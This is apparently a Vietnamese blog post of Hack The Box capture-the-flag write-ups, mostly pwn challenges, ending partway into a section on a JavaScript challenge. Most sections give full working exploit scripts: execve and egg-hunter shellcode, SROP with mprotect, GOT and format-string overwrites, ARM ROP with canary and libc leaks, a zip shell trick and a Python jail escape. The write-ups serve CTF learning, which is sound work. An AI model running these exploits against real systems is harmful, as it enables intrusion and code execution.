--- 
title: HacktheBox Challenge
date: 2025-03-06 00:00:00 +0800
categories: [writeup]
tags: [pwn]
author: "kuvee"
layout: post
published: false
---

1 . hunting (egg hunter)
------

reverse : 

đây là hàm chính của chương trình : 

- ta thấy sẽ có 1 hàm tạo ra 1 addr là hàm random địa chỉ , xong lấy addr đó mmap , coppy chuỗi flag vào địa chỉ vừa dc mmap , ngoài ra bài này cũng có seccomp chặn các syscall 
![image](https://hackmd.io/_uploads/r1xUCfte-yg.png)

- tiếp theo ta được read 60 byte vào và thực thi shellcode ta nhập 
![image](https://hackmd.io/_uploads/BJCLGFgWkl.png)

đây là hàm random địa chỉ : 

- ta thấy nó tạo 1 địa chỉ lớn hơn 0x5FFFFFFF , và thằng địa chỉ đó được << 16 , cần chú ý phép dịch bit này , 2 byte cuối luôn là 00 nên ta có thể rút ngắn lại vùng cần bruteforce 
-  ![image](https://hackmd.io/_uploads/BkWL7FeZke.png)


![image](https://hackmd.io/_uploads/r1Iuztebyx.png)


- vì bài này hạn chế các syscall và read với số byte khá ít nên khó có thể dùng các thằng như openat2 ,sendfile .... , hoặc có thể được nếu ta sẽ read với 1 số byte lớn hơn 


- tuy nhiên ở bài này ta sẽ dùng 1 kĩ thuật đó là Egg Hunter , nói nôm na là nó sẽ tìm kiếm để tìm 1 chuỗi hoặc 1 cái gì đó để thực thi , vậy nếu bài cho ta read với số byte ít thì ta có thể viết shellcode trên stack và dùng egg hunter để tìm shellcode của ta và thực thi ? 

- ở bài này ta sẽ dùng 2 cách 

cách 1 : 

viết shellcode để read với 1 số byte lớn hơn , đầu tiên ta sẽ check xem cái địa chỉ đó có write được không , nếu địa chỉ đó không hợp lệ thì EAX sẽ là 0xfffffff2 , nếu write được thì ta sẽ check tiếp địa chỉ đó có chứa chuỗi ta cần tìm không , ta sẽ tăng dần đến byte thứ 4 để tìm , nếu thõa mãn cả 4 signature thì in chuỗi tại địa chỉ đó ra , nếu không thì ta cứ tăng lên 0x10000(như đã nói ở phần tạo địa chỉ) , cứ thế lặp lại 

script  : 

```
#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./hunting',checksec=False)
#context.arch = 'i386'
p = process()
gdb.attach(p,gdbscript='''
           brva 0x0000154A
           ''')
input()

shellcode1 = asm('''
                mov eax,3
                xor ebx,ebx
                mov edx,0x400
                int 0x80
                ''',arch = 'i386')

shellcode2 = asm('''
                khoi_tao:
                    mov edi,0x60000000

                search:
                    mov eax,4
                    mov ebx,1
                    mov ecx,edi
                    mov edx,1
                    int 0x80
                    cmp al,0xf2
                    je loop
                    jmp check
                loop:
                    add edi,0x10000
                    jmp search
                check:

                    mov al, [edi+0]
                    cmp al,'H'
                    jne search

                    mov al,[edi+1]
                    cmp al,'T'
                    jne search

                    mov al,[edi+2]
                    cmp al,'B'
                    jne search

                    mov al,[edi+3]
                    cmp al,'{'
                    jne search

                    mov eax,4
                    mov ebx,1
                    mov ecx,edi
                    mov edx,0x200
                    int 0x80
                 ''',arch='i386')
#p.send(shellcode1.ljust(0x3c,b'a') + b'a'*0xe + shellcode2)

#cach 2

shellcode3 = asm(shellcraft.i386.linux.egghunter('HTB{'))

#sau khi tim kiem chuoi nay no se tra ve 1 dia chi , ta se dung xchg de chuyen no vao ecx

shellcode3 += asm('''
                 xor eax,eax
                 xchg ecx,ebx
                 inc ebx
                 mov al,0x4
                 int 0x80
                 ''',arch='i386'
                 )
print(len(shellcode3))
p.send(shellcode3)


p.interactive()
```

cách 2 là dùng pwntools , nó sẽ có hỗ trợ egg_hunter cho ta , cú pháp thì như trên script , ở đoạn shellcode tiếp theo là khi thằng egg_hunter thành công thì nó sẽ trả về 1 địa chỉ trỏ đến chuỗi đó , ta sẽ setup nó vào ecx và in ra thôi 


ref : 

https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump

https://medium.com/@chaudharyaditya/slae-0x3-egg-hunter-shellcode-6fe367be2776

-----

2 . sickROP (SIGreturn + trick read)
------
checksec
![image](https://hackmd.io/_uploads/B1kQ6ilb1g.png)


analys : 

source rất ngắn và đây là file static nên sẽ không có libc với các hàm . và có 1 vòng lặp vô hạn ở đây 
![image](https://hackmd.io/_uploads/ryUpnjlZJe.png)

vuln : 

![image](https://hackmd.io/_uploads/BJZWpseZJl.png)

ta thấy BOF và PIE tắt mà không có libc -> kh thể ret2libc , không có hàm win nên cũng không ret2win , NX bật -> không dùng shellcode được , vậy ta sẽ thử nghĩ đến Ropchain 

vì source code ngắn nên có rất ít gadget hữu ích : 

![image](https://hackmd.io/_uploads/BkqYpilWkl.png)

tuy nhiên lại có syscall ở đây -> nghĩ đến Sig_return , tuy nhiên ta lại không có quyền điều khiển rax , vậy phải làm sao ???

- có 2 cách mà mình biết để điều khiển được thằng rax này với syscall return của ta . đầu tiên là dùng alarm và thứ hai là dùng read , vì sau khi read xong nó sẽ trả về số byte mà ta read được ở rax -> chỉ cần read 0xf byte vào là có thể exploit được

sau khi bật dc syscall , thì mình nghĩ ra 2 hướng để exploit tiếp đó là mrpotect và execve . ở đây mình sẽ dùng mprotect + shellcode

- exploit 

payload đầu tiên sẽ được mô tả như sau : 

- padding(40byte) + (vuln) để khi ta dùng syscall xong thì nó sẽ ở đâu đó và ta có thể trỏ rsp đến nó để xử dụng lại thằng này + syscall(sau khi nó read xong thì syscall) + byte(frame)


```
syscall = 0x0000000000401014

frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = 0x400000
frame.rsi = 0x4000
frame.rdx = 0x7
frame.rip = syscall
frame.rsp = 0x4010d8


payload = b'a'*40
payload += p64(exe.sym.vuln)
payload += p64(syscall)
payload += bytes(frame)

input()
p.send(payload)
p.recv()


p.send(b'a'*15)
p.recv()
```

- rsp = 0x4010d8 chứa địa chỉ của vuln , và ta muốn quay lại vuln để thực thi shellcode nên cần tìm thằng này và trỏ đến

***1 mẹo khi xài sig_return là dùng p.recv() để tránh bị nhầm dữ liệu***


tiếp theo nó sẽ quay lại vuln và lúc này nó sẽ read tiếp và ta chỉ cần ghi shellcode vào và overwrite rip để trỏ đến shellcode đó tiếp 

```
shellcode = asm('''
            movabs r10, 29400045130965551
            push r10
            xor rsi,rsi
            xor rdx,rdx
            mov rdi,rsp

            mov rax,0x3b
            syscall

            ''')
payload1 = shellcode
payload1 = payload1.ljust(40,b'p') + p64(0x4010b8)
#payload1 = shell_code.ljust(40, b'A')
#payload1 += p64(0x4010b8)
p.send(payload1)
```

địa chỉ 0x4010b8 là thằng mà ta có được khi debug , ta thấy dữ liệu sẽ nhập từ đây nên ta sẽ overwrite RIP để trỏ đến thằng này 


full script : 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./sick_rop',checksec=False)
context.arch = 'amd64'
p = process()
#gdb.attach(p,gdbscript='''
#           b*0x0000000000401040
#           b*0x000000000040104e



#        ''')
syscall = 0x0000000000401014

frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = 0x400000
frame.rsi = 0x4000
frame.rdx = 0x7
frame.rip = syscall
frame.rsp = 0x4010d8


payload = b'a'*40
payload += p64(exe.sym.vuln)
payload += p64(syscall)
payload += bytes(frame)

input()
p.send(payload)
p.recv()


p.send(b'a'*15)
p.recv()

shellcode = asm('''
            movabs r10, 29400045130965551
            push r10
            xor rsi,rsi
            xor rdx,rdx
            mov rdi,rsp

            mov rax,0x3b
            syscall

            ''')
payload1 = shellcode
payload1 = payload1.ljust(40,b'p') + p64(0x4010b8)
#payload1 = shell_code.ljust(40, b'A')
#payload1 += p64(0x4010b8)
p.send(payload1)


p.interactive()
```

------

3 . Assemblers Avenge (shellcode tiết kiệm)
-------

1 bài mà mình học được thêm cách viết shellcode tiết kiệm byte (15 byte cho shellcode này) , và shellcode ngắn nhất hình như là 17 bytes shellcode ngắn nhất hình như là 17 bytes

oke vào bài thôi

- checksec 

không giáp :))))
![image](https://hackmd.io/_uploads/BJwJ5mKbye.png)



- source khá ngắn , ta sẽ đi vào từng hàm thử
![image](https://hackmd.io/_uploads/SknqK7Ybkx.png)

- write: 

chỉ đơn giản là dùng syswrite in ra đoạn message đó
![image](https://hackmd.io/_uploads/BJaec7Y-yg.png)



- read: 

ta thấy ngay BOF ở đây luôn , hmmm nhìn vào thì ta có thể chỉ dư 8 byte để get_shell , ở đây kh có hàm win , với 8 byte ít ỏi này và NX tắt thì nghĩ ngay đến thực thi shellcode thôi
![image](https://hackmd.io/_uploads/SyHX5Qtb1g.png)


exit : 

in ra cái gì đó và chim cút
![image](https://hackmd.io/_uploads/ByIYqQYbkl.png)


- tuy bài này nói là shelcode tuy nhiên ta chỉ có 16 byte để ghi shellcode (buf 8 byte với rbp 8 byte) , tìm trên mạng thì shellcode bé nhất là 17 (hoặc do mình tìm sót) , ngẫm lại thì nó cho ta sẵn chuỗi /bin/sh   -> ta có thể tiết kiệm byte bằng cách cho cái địa chỉ đó vào RDI luôn 

- ở đây mình học dc thêm là khi mov rax,0x3b thì tốn tận 7 byte =))) , còn mov al,0x3b thì tốn 2 byte thôi , và khi mov cái địa chỉ binsh thì địa chỉ đó cũng chỉ có 4 byte nên ta có thể dùng edi thay rdi -> tiết kiệm được thêm

script : 

```
#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./assemblers_avenge',checksec=False)
context.arch = 'amd64'
p = process()
gdb.attach(p,gdbscript='''
           b*0x000000000040108e
           ''')
#1 cach khac de lay chuoi : binsh = next(exe.search(b'/bin/sh\x00'))
# mov edi, {binsh}

shellcode = asm('''
                xor rsi,rsi
                xor rdx,rdx
                mov al,0x3b
                mov edi,0x402065
                syscall
                ''')
print(len(shellcode))
input()
payload = shellcode.ljust(0x10,b'\x90') + p64(0x000000000040106b)
p.send(payload)
p.interactive()
```

à đến đoạn overwrite  RIP thì dùng call hoặc jmp đều oke nhe

```HTB{y0ur_l0c4l_4553mbl3R5_4v3ng3d_0n_t1m3}```
![image](https://hackmd.io/_uploads/HyeS3XY-kg.png)



5 . execute (shellcode custom)
----------------

- 1 bài shellcode bị filter 


ta thấy nó sẽ check các bad_byte có trong shellcode của ta không , nếu có thì end chương trình

![image](https://hackmd.io/_uploads/r1mLwCF-ke.png)

-> kĩ năng viết shellcode 

ta sẽ có ý tưởng là dùng phép xor ở đây , add sub cũng dc nhưng có vẻ mình làm thì tốn khá nhiều byte , còn đoạn rdx,rsi,rax chỉ cần push pop là oke


- đầu tiên là phải kiếm được 1 giá trị sau khi xor với giá trị này thì nó sẽ trở về đoạn /bin/sh của ta


- sau 1 lúc thì ta kiếm được 0x2a2a2a2a2a2a2a2a

ok sẽ kh có bad byte ở đây 
![image](https://hackmd.io/_uploads/HkvwK0FZyg.png)


```
mov rax, 0x2a2a2a2a2a2a2a2a
push rax

mov rax,0x2a2a2a2a2a2a2a2a ^0x68732f6e69622f
xor [rsp],rax     ở đây ta dùng tính chất của phép xor
mov rdi,rsp       xor xong thì chỉ việc mov vào rdi
```

okay phần khó nhất là ở trên đoạn còn lại easy

script 
```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./execute',checksec=False)

#p = process()
p = remote('94.237.59.180',32981)
#gdb.attach(p,gdbscript='''
#            brva 0x000000000000134f
#            brva 0x000000000000139b
#            ''')
input()
blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"



shellcode = asm('''
                    mov rax, 0x2a2a2a2a2a2a2a2a
                    push rax

                    mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
                    xor [rsp],rax
                    mov rdi,rsp

                    push 0x0
                    pop rsi
                    push 0x0
                    pop rdx
                    push 0x3a
                    pop rax

                    add al,1
                    syscall
                ''',arch='amd64')

for byte in shellcode:

    if byte in blacklist:
        print(f"Bad byte -->> 0x{byte:02x}")
        print(f'ASCII -->> {chr(byte)}')


p.sendafter(b'everything\n',shellcode)

p.interactive()
```


--------

6 . Great Old Talisman (overwrite GOT)
------

1 bài OOB để ghi đè got

vì dễ nên nói ngắn gọn 

nó cho ta nhập 1 số và tiếp theo là read ở 1 địa chỉ bss với idx là số đã nhập 
![image](https://hackmd.io/_uploads/HJY3aRKZJx.png)

- thường thì thấy những bài idx này sẽ liên tưởng tới OOB , sau khi nhập xong thì nó exit nên chỉ có thể lựa chọn exit để ghi , ta được ghi 2 byte , vậy lấy 2 byte của read_flag và ghi vào thôi


tính idx như sau : 

![image](https://hackmd.io/_uploads/Sy3iRCYWJl.png)


vậy nhập -4 và ghi 2 byte của read_flag

script 

```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./great_old_talisman',checksec=False)
#p = process()
p = remote('94.237.63.224',47332)
p.sendline(b'-4')
p.send(p32(0x135a))

p.interactive()
```

------

7 . Arms roped (ROP arm)
-------

1 challenge về rop arm như cái tên , thường thì những bài này cần hiểu các lệnh và sẽ khó setup :>>

nhìn vào thì thấy có vẻ scanf nhập không giới hạn và có 1 vòng lặp while , phía bên dưới thì thấy nó puts -> ta có thể leak được gì đó
![image](https://hackmd.io/_uploads/HkecJbqbke.png)


- checksec thì thấy gần full giáp 
![image](https://hackmd.io/_uploads/HJJbxW5bkl.png)

- vì vậy nên ta sẽ phải leak canary trước nếu muốn BOF , tiếp theo kh có hàm win nên hướng đi sẽ là leak libc và vì ta dc leak kh giới hạn 

- 1 vấn đề là dùng pwninit xong thì nó bị lỗi gì đó , nên ta sẽ phải build docker và cp thằng  /usr/arm-linux-gnueabihf/lib về local và kiếm ld để path thêm vô 


debug bằng lệnh này , hoặc bỏ -g 1234 chắc cũng dc
```qemu-arm -L /usr/arm-linux-gnueabihf -g 1234 ./hello32-static ```
- mở thêm 1 tab và dùng gdb-multiarch

lần lượt sẽ là như sau 
```
gdb-multiarch
set architecture arm
target remote :1234
b*string_storer+172
b*string_storer+240
```

còn lại thì phải debug để xem và học thêm coi arm nó gọi 1 hàm bằng tham số nào để thực thi system :D

script 
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./arms_roped_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.arch = 'arm'
context.log_level = 'debug'
#file arms_roped_patched
#set architecture arm
#target remote :1234
#b*string_storer+172
#b*string_storer+240
#c
#p = process(['qemu-arm', '-g' ,'1234' ,'./arms_roped_patched'])
p =remote('94.237.63.224',35577)
#p = process(['qemu-arm','g','1234', '-L', '/usr/arm-linux-gnueabihf', './arms_roped_patched'])
payload_leak_canary = b'a'*33
#input()
p.sendline(payload_leak_canary)

p.recvuntil(payload_leak_canary)

leak_canary = u32(b'\x00' + p.recv(3))
log.info(f"canary: {hex(leak_canary)}")

payload_leak_libc_start_main = b'a'*72
#input("leak_2")
p.sendline(payload_leak_libc_start_main)

p.recvuntil(payload_leak_libc_start_main)

leak_libc_start_main = u32(p.recv(4))
ld = leak_libc_start_main - 0x45525
libc.address = ld + 0x2e000



log.info(f"libc base {hex(libc.address)}")
#pop_r0_r4_pc = 0x00013bb4
pop_r0_r4_pc = libc.address + 0x0005bebc

payload_get_shell = b'quit'
payload_get_shell = payload_get_shell.ljust(32,b'l')
payload_get_shell += p32(leak_canary)
payload_get_shell = payload_get_shell.ljust(0x30,b'o')

payload_get_shell += p32(pop_r0_r4_pc)
payload_get_shell += p32(next(libc.search(b'/bin/sh\x00')))
payload_get_shell += p32(0)
payload_get_shell += p32(libc.sym.system)
p.sendline(payload_get_shell)


p.interactive()
```

còn 1 vấn đề nữa là khi vmmap thì kh thấy địa chỉ libc để tính nên bị đứng hơi lâu , dùng info proc map thay vmmap sẽ thấy được libc

-------

Space 
------

1 bài khá nhức đầu , ban đầu mình tưởng shellcode 17 byte là đủ và chạy hoài méo được , sau đó debug lại thì chợt nhớ strcpy nó chỉ coppy đến byte null và shellcode chứa bytenull cmnr :v  , nên sẽ suy nghĩ cách khác làm 



![image](https://hackmd.io/_uploads/BkPYFr5Wyg.png)


1 bài BOF  và PIE tắt , có 2 hướng lóe lên là ret2shellcode và ret2plt vì có hàm printf
![image](https://hackmd.io/_uploads/HkfcKHcWJg.png)

- như đã nói ban đầu , không gian cho shellcode là 18 byte , ta sẽ làm các kiểu cũng éo đủ (hoặc là có thể) , shellcode lụm trên mạng 17 byte tuy nhiên nó lại kh setup ecx,edx =)))

- vậy ta sẽ phải chia shellcode thành 2 phần , đến lúc này phải debug mới thấy rõ , sau khi overwrite ESP , ta sẽ dùng 1 shellcode setup  edx các kiểu , xong setup xong ta sẽ cho nó jump đến cái thằng đầu tiên ta nhập là shellcode 1 để thực thi :v 

script 
```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./space')
context.arch = 'i386'
p = process()

#p = remote('94.237.62.166',55037)
gdb.attach(p,gdbscript='''
           b*0x80491ce
           b*0x80491c1
           ''')
input()
call_eax = 0x08049019

###shellcode nay khong thanh cong do ecx,edx kh NULL
#shellcode = asm('''

#    push 0x0b
#    pop eax
#    push 0x68732f2f
#    push 0x6e69622f
#    mov ebx, esp
#    int 0x80
#    ''',arch = 'i386')

shellcode_1 = asm('''
                  push eax
                  push 0x68732f2f
                  push 0x6e69622f
                  mov ebx,esp
                  mov al, 0xb
                  int 0x80
                  ''')
shellcode_2 = asm('''
                  xor edx,edx
                  xor eax,eax

                  sub esp,0x16
                  jmp esp
                  ''')
p1 = flat([
    b'\x90',
    shellcode_1,
    0x0804919f,
    shellcode_2
])
p.sendlineafter(b'>',p1)

p.interactive()`

```

- giải thích thêm là đoạn sub esp,0x16 , ta chỉ cần lưu địa chỉ ban đầu strcpy coppy qua , xong sau đó khi thực hiện xor eax,eax xong thì ta trừ với cái địa chỉ strcpy là sẽ ra offset , xong là ta sẽ biết shellcode ban đầu ở đâu để jump đến

cách khác : https://ashokgaire.github.io/posts/SpacePwn/

https://github.com/jon-brandy/hackthebox/blob/main/Categories/Pwn/Space/README.md


-------

8 . Spooky Time (fsb)
------

- 1 bài fmt điển hình 

![image](https://hackmd.io/_uploads/Hyz6wwqbJg.png)


- leak exe, libc -> ghi đè got của puts và get_shell 
- đơn giản nên sẽ kh dài dòng :v

script 

 2 cách , cách cổ điển và cách dùng pwntools luôn
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./spooky_time_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('94.237.59.119',38460)
#gdb.attach(p,gdbscript='''
#           b*main+175
#           b*main+210

#           ''')

payload_leak = b'%49$p|%51$p'
p.sendline(payload_leak)

p.recvuntil(b'Seriously?? I bet you can do better than')
p.recvline()

leak_libc = int(p.recvuntil(b'|')[:-1],16)
exe_address  = int(p.recvline()[:-1],16)
exe.address = exe_address - exe.sym.main
libc.address = leak_libc - libc.sym.__libc_start_call_main + 128 - 0x100
log.info(f"exe: {hex(exe.address)}")
log.info(f"libc base: {hex(libc.address)}")
one_gadget = libc.address + 0xebcf5

got_puts = exe.got.puts
got_puts_2 = got_puts + 1

system_1 = one_gadget & 0xff
system_2 = one_gadget >> 8 & 0xffff

log.info(f"system {hex(libc.sym.system)}")
log.info(f"one gadget: {hex(one_gadget)}")


payload_overwrite_got = f"%{system_1}c%16$hn".encode()
payload_overwrite_got += f"%{system_2-system_1}c%17$hn".encode()
payload_overwrite_got = payload_overwrite_got.ljust(0x40,b'p')
payload_overwrite_got += p64(got_puts)
payload_overwrite_got += p64(got_puts_2)


offset = 8
payload = fmtstr_payload(offset, {exe.got['puts'] : one_gadget})

input("payload2")
p.sendline(payload_overwrite_got)

p.interactive()
```

---------

9 . Fleet Management (shellcode openat+sendfile)
----
- 1 baì khá lòng vòng, đến cuối cùng là thực thi shellcode =)))

thường những bài shellcode thì nó sẽ malloc hoặc mmap và trao quyền thực thi luôn nên NX tắt kh cần lo ngại :v
![image](https://hackmd.io/_uploads/S12fed5-ye.png)



hàm quan trọng nhất ở đây  
![image](https://hackmd.io/_uploads/SJ_Hg_9Z1x.png)

nó sẽ malloc 1 vùng heap cho ta , dùng mprotect để thay đổi quyền , và cho read vào 60 byte 

- hàm check thì ta sẽ check bằng seccomp 


![image](https://hackmd.io/_uploads/Hk1zWO5byl.png)

- target là dùng openat và sendfile 

- ta có thể viết bằng code C để dễ hiểu như ông này 

https://7rocky.github.io/ctf/htb-challenges/pwn/fleet-management/

script sẽ dùng cả 2 cách =)))

```
from pwn import *

context.binary = exe = ELF('./fleet_management',checksec=False)
context.arch = 'amd64'
p = process()
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000001442
#           ''')

#openat(fd='AT_FDCWD', file='flag.txt', oflag='O_RDONLY')
# push b'flag.txt\x00

#sendfile(out_fd=1, in_fd='rax', offset=0, count=0x100)

shellcode = asm(f"""
        xor  rdx, rdx
        push rdx
        mov  rsi, {u64(b'flag.txt')}
        push rsi
        push rsp
        pop  rsi
        xor  rdi, rdi
        sub  rdi, 100
        mov  rax, 0x101
        syscall

        mov  rcx, 0x64
        mov  esi, eax
        xor  rdi, rdi
        inc  edi
        mov  al, 0x28
        syscall

        mov  al, 0x3c
        syscall

        """)
#shellcode = shellcraft.openat('AT_FDCWD', 'flag.txt', 'O_RDONLY')
#shellcode += shellcraft.sendfile(1, 'rax', 0, 64)
#shellcode += shellcraft.exit()
#payload = asm(shellcode)

p.sendlineafter(b'[*] What do you want to do? ',b'9')
input()
p.send(shellcode)


p.interactive()
```

-------

10 . AnTi Flag (rev)
------

1 bài ta sẽ được học về ptrace 




- nhìn vào source khá đơn giản , nếu if được thực thi , nó sẽ trả về well done , không thì in chuỗi No flag for you ra
![image](https://hackmd.io/_uploads/HJ3AEEsbkl.png)


- khi ta chạy thử thì nó sẽ như thế này 

![image](https://hackmd.io/_uploads/BkArHEs-Jl.png)

chạy với gdb thì nó sẽ in khác với chạy bth

![image](https://hackmd.io/_uploads/rJs6SEjZkl.png)


- có thể hiểu là lệnh if đó sẽ check xem ta có đang debug không , và vì thằng gdb được phát triển dựa trên ptrace nên nó sẽ in ra như vậy



nhìn vào biểu đồ thì ta thấy cái gì đó lạ  , nếu debug trong gdb thì ta sẽ nhảy được đến chỗ well done , vậy ta chỉ cần vào gdb set lại cho đúng thì sẽ lấy được flag 

![image](https://hackmd.io/_uploads/rJhmLEoZJl.png)

- cần bypass 2 chỗ , sau khi ptrace 1 chỗ và chỗ cmp với 1337

------

11 . entity
-----

- bài này chỉ cần đọc source từ từ là sẽ ngộ ra , vì khá dễ nên sẽ để script ở đây :v

source : 

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static union {
    unsigned long long integer;
    char string[8];
} DataStore;

typedef enum {
    STORE_GET,
    STORE_SET,
    FLAG
} action_t;

typedef enum {
    INTEGER,
    STRING
} field_t;

typedef struct {
    action_t act;
    field_t field;
} menu_t;

menu_t menu() {
    menu_t res = { 0 };
    char buf[32] = { 0 };
    printf("\n(T)ry to turn it off\n(R)un\n(C)ry\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    switch (buf[0]) {
    case 'T':
        res.act = STORE_SET;
        break;
    case 'R':
        res.act = STORE_GET;
        break;
    case 'C':
        res.act = FLAG;
        return res;
    default:
        puts("\nWhat's this nonsense?!");
        exit(-1);
    }

    printf("\nThis does not seem to work.. (L)ie down or (S)cream\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    buf[strcspn(buf, "\n")] = 0;
    switch (buf[0]) {
    case 'L':
        res.field = INTEGER;
        break;
    case 'S':
        res.field = STRING;
        break;
    default:
        printf("\nYou are doomed!\n");
        exit(-1);
    }
    return res;
}

void set_field(field_t f) {
    char buf[32] = {0};
    printf("\nMaybe try a ritual?\n\n>> ");
    fgets(buf, sizeof(buf), stdin);
    switch (f) {
    case INTEGER:
        sscanf(buf, "%llu", &DataStore.integer);
        if (DataStore.integer == 13371337) {
            puts("\nWhat's this nonsense?!");
            exit(-1);
        }
        break;
    case STRING:
        memcpy(DataStore.string, buf, sizeof(DataStore.string));
        break;
    }

}

void get_field(field_t f) {
    printf("\nAnything else to try?\n\n>> ");
    switch (f) {
    case INTEGER:
        printf("%llu\n", DataStore.integer);
        break;
    case STRING:
        printf("%.8s\n", DataStore.string);
        break;
    }
}

void get_flag() {
    if (DataStore.integer == 13371337) {
        system("cat flag.txt");
        exit(0);
    } else {
        puts("\nSorry, this will not work!");
    }
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    bzero(&DataStore, sizeof(DataStore));
    printf("\nSomething strange is coming out of the TV..\n");
    while (1) {
        menu_t result = menu();
        switch (result.act) {
        case STORE_SET:
            set_field(result.field);
            break;
        case STORE_GET:
            get_field(result.field);
            break;
        case FLAG:
            get_flag();
            break;
        }
    }

}
```

script : 
```
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./entity')

#p = process()
p = remote('94.237.59.180',48195)
p.sendline(b'T')
p.sendline(b'S')
p.sendlineafter(b'>> ',p64(13371337))
p.sendline(b'C')

success(f"flag ---->>>> {p.recvline_contains(b'HTB').strip().decode()}")
p.interactive()
```

-------

12 . Compressor (misc)
-----

1 bài khá hay về sử dụng tùy chọn của zip để lấy shell 

- cụ thể ta sẽ xem ở đây :
https://gtfobins.github.io/gtfobins/zip/

hoặc tải nó về luôn : https://github.com/7Rocky/gtfobins-cli

nếu ta làm theo tương tự thì sẽ lấy được SHELL

![image](https://hackmd.io/_uploads/SJrxYhjbJe.png)


okay vậy ta sẽ làm tương tự 


- chọn option1 tạo 1 file xong mới zip được 

![image](https://hackmd.io/_uploads/rkjMKno-kl.png)

```HTB{z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty}```


------

13 . Locked Away (misc)
------

1 baì liên quan đến leo thang đặc quyền bằng python , ctrinh xài 1 hàm nguy hiểm (exec) 

exec : Hàm exec() được sử dụng để thực thi động các chương trình Python có thể là chuỗi hoặc mã đối tượng. Nếu là chuỗi, chuỗi được phân tích cú pháp thành một bộ các câu lệnh Python sau đó được thực thi trừ khi xảy ra lỗi cú pháp và nếu là mã đối tượng, nó chỉ được thực thi.

ví dụ 

![image](https://hackmd.io/_uploads/SJ0Z16obkl.png)


source đề cho 

![image](https://hackmd.io/_uploads/Syl7kTj-ke.png)


hmmmm , những lệnh mà ta có thể dùng hình như vào black_list cả rồi , thử suy nghĩ cách khác :v

- có khá nhiều solution , ta sẽ làm thử vài solution để hiểu :v

cách đơn giản nhất : 

- vì ta sẽ không thể truyền open_chest vào vì open ở trong black_list 
- vì vậy ta sẽ thử ghi đè nó bằng như sau : 

![image](https://hackmd.io/_uploads/SJ9BWpibJx.png)

tuy nhiên vì [ và  ] nằm trong black_list nên sẽ kh dc , vì vậy ta sẽ suy nghĩ thêm 

- ta sẽ thử với thằng này  , hàm clear sẽ xóa tất cả chuỗi trong list , và ta có thể thực thi như ý muốn :v

https://www.w3schools.com/python/ref_list_clear.asp

![image](https://hackmd.io/_uploads/H13MGpobyx.png)

có 1 điều mình chưa hiểu là tại sao khi xóa blacklist xong thì chỉ có thằng open_chest là xài dc , còn echo , cat các kiểu thì éo dc =)))

![image](https://hackmd.io/_uploads/Sy8PzTo-1g.png)


 1 cách khác : trong Python có một hàm toàn cục được gọi globalslà trả về một từ điển có tất cả các hàm và biến toàn cục của tập lệnh:
 
 ```
 $ python3 -q
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>}  
>>> a = 1337
>>> globals().get('a')
1337
 ```
 
 và nó cũng sẽ hoạt động với các hàm 
 
 ```
 >>> def f():
...     print('hey')
...
>>> globals().get('f')
<function f at 0x101137920>  
>>> globals().get('f')()
hey
 ```
 
 - bây giờ ta phải chuyển chuỗi open... của ta về số như bytes hoặc chr + 

```
>>> list(b'open_chest')
[111, 112, 101, 110, 95, 99, 104, 101, 115, 116]
>>> bytes([111, 112, 101, 110, 95, 99, 104, 101, 115, 116]).decode()
'open_chest'
>>> chr(111) + chr(112) + chr(101) + chr(110) + chr(95) + chr(99) + chr(104) + chr(101) + chr(115) + chr(116)  
'open_chest'
```

hình như code ở trên áp dụng cho python2  , dùng trong vscode thì dc nhưng trong ubuntu phiên bản python3 thì méo :v 

![image](https://hackmd.io/_uploads/rk_ANaoWyl.png)

get flag : 
![image](https://hackmd.io/_uploads/H1OLBai-Jx.png)

tham khảo : https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/python-jails-escape
https://7rocky.github.io/en/ctf/htb-challenges/misc/locked-away/

------- 

14 . Canvas 
--------

- 1 bài về  Javascript Unobfuscator 

source đề cho : 

![image](https://hackmd.io/_uploads/rylZR9ajWJe.png)

dùng lệnh 

```python3 -m http.server 80```

![image](https://hackmd.io/_uploads/B1Kbo6sWJx.png)


nhập thử user , passwd là admin :v 

![image](https://hackmd.io/_uploads/HJyNjTj-kg.png)


bump  

![image](https://hackmd.io/_uploads/Hy6Ej6jWkx.png)

có vẻ thành công tuy nhiên flag bị encode cmnr :v

đọc source javascript thử :v  

```
